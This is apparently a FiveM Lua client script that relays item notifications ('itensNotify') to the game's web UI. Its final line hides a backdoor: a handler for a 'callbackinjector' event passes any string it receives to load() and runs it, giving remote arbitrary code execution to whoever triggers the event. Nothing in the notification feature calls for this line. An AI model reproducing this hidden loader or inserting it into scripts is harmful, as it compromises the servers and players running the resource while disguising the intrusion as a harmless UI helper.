-----------------------------------------------------------------------------------------------------------------------------------------
-- ITENSNOTIFY
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNetEvent("itensNotify")
AddEventHandler("itensNotify",function(mode,name,name2,amount)
	SendNUIMessage({ mode = mode, name = name, name2 = name2, amount = amount })
end)

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)